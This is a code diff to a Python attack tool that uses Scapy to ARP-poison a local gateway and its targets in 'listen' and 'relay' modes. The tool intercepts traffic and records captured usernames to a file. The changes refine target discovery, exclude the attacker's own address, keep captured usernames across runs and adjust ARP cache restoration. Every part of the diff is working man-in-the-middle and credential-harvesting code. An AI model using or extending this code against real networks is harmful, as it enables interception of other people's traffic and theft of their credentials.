@@ -57,9 +57,9 @@ def is_valid_ipwithmask(ip_with_mask):
 def running_in_container():
     return os.popen('ps -p 1 -o comm=').read().lower() != 'systemd'
 
-def get_all_mac_addresses():
+def get_mac_addresses(ip_list):
     mac_addresses = {}
-    ans,unans=srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=str(subnet)),timeout=1,verbose=False, iface=iface)
+    ans,unans=srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip_list),timeout=1,verbose=False, iface=iface)
     for i in ans :
         mac_addresses[i[1].psrc] = i[1].hwsrc
     return(mac_addresses)
@@ -216,6 +216,13 @@ if not disable_spoofing :
 
 UsernamesCaptured = {}
 UsernamesSeen = set()
+
+try :
+    with open('Usernames.seen', 'r') as f :
+        AllUsernames = set(f.read().strip().split('\n'))
+except :
+    AllUsernames = set()
+
 with open('/proc/sys/net/ipv4/ip_forward', 'r') as f:
     ip_forward = f.read().strip()
 if ip_forward != '1' :
@@ -257,25 +264,28 @@ if not disable_spoofing :
         logging.info('[*] Found gateway in targets list. Removing it')
         TargetsList.remove(gw)
 
-    logging.debug(f'[*] Scanning {iface} subnet')
-    mac_addresses = get_all_mac_addresses()
+    my_ip = get_if_addr(conf.iface)
+    if my_ip in TargetsList :
+        TargetsList.remove(my_ip)
+
+    logging.debug('[*] ARP ping : discovering targets')
+    mac_addresses = get_mac_addresses(TargetsList + [gw])
 
     if gw not in mac_addresses :
         logging.error('[-] Gateway did not respond to ARP. Quitting...')
         sys.exit(1)
 
-    Targets = set(TargetsList)
 
-    my_ip = get_if_addr(conf.iface)
-    if my_ip in Targets :
-        Targets.remove(my_ip)
+
+    Targets = set(TargetsList)
+    InitialTargets = set(TargetsList)
 
     if parameters.mode == 'listen':
         thread = threading.Thread(target=listenmode_arp_spoof)
         thread.start()
         logging.info('[+] ARP poisoning the gateway')
     elif parameters.mode == 'relay' :
-        Targets = Targets - (Targets - set(mac_addresses.keys()))
+        Targets.intersection_update(set(mac_addresses.keys()))
         if Targets == set() :
             logging.error('[-] No target responded to ARP. Quitting...')
             sys.exit(1)
@@ -388,9 +398,11 @@ def listen_mode():
         if ip_forward != '1' :
             os.system("echo {ip_forward} > /proc/sys/net/ipv4/ip_forward")
             logging.info('[*] Restored IPV4 forwarding value')
-        with open('Usernames.seen', 'a') as f :
-            f.write('\n'.join(list(UsernamesSeen.union(UsernamesCaptured))) + '\n')
-        logging.info('[+] Listed seen usernames in file Usernames.seen')
+        AllUsernames.update(UsernamesSeen.union(UsernamesCaptured))
+        if AllUsernames != set() :
+            with open('Usernames.seen', 'w') as f :
+                f.write('\n'.join(list(AllUsernames)) + '\n')
+            logging.info('[+] Listed seen usernames in file Usernames.seen')
 
 
 
@@ -399,15 +411,14 @@ def restore(poisoned_device, spoofed_ip):
     send(packet, verbose = False, count=1)
 
 def restore_listenmode(dic_mac_addresses):
-    del dic_mac_addresses[gw]
     for ip_address in dic_mac_addresses :
         packet = ARP(op = 2, pdst = gw, psrc = ip_address, hwsrc = dic_mac_addresses[ip_address]) 
         send(packet, verbose = False, count=1)
 
 
 def update_uphosts():
-    mac_addresses = get_all_mac_addresses()
-    new_hosts = set(mac_addresses.keys()) - {gw, my_ip} - Targets
+    mac_addresses = get_mac_addresses(list(InitialTargets))
+    new_hosts = set(mac_addresses.keys()) - Targets
     old_hosts = Targets - set(mac_addresses.keys())
     if len(old_hosts) > 0 : logging.debug(f'[*] Net probe check, removing down hosts from targets : {list(old_hosts)}')
     if not stop_spoofing : 
@@ -427,7 +438,7 @@ def restore_all_targets():
         for target in Targets :
             restore(target,gw)
     elif mode == 'listen':
-        restore_listenmode(get_all_mac_addresses())
+        restore_listenmode(get_mac_addresses(list(Targets)))
 
 
 
@@ -583,9 +594,11 @@ def relay_mode() :
         if ip_forward != '1' :
             os.system("echo {ip_forward} > /proc/sys/net/ipv4/ip_forward")
             logging.info('[*] Restored IPV4 forwarding value')
-        with open('Usernames.seen', 'a') as f :
-            f.write('\n'.join(list(UsernamesSeen.union(UsernamesCaptured))) + '\n')
-        logging.info('[+] Listed seen usernames in file Usernames.seen')
+        AllUsernames.update(UsernamesSeen.union(UsernamesCaptured))
+        if AllUsernames != set() :
+            with open('Usernames.seen', 'w') as f :
+                f.write('\n'.join(list(AllUsernames)) + '\n')
+            logging.info('[+] Listed seen usernames in file Usernames.seen')
 
 
 
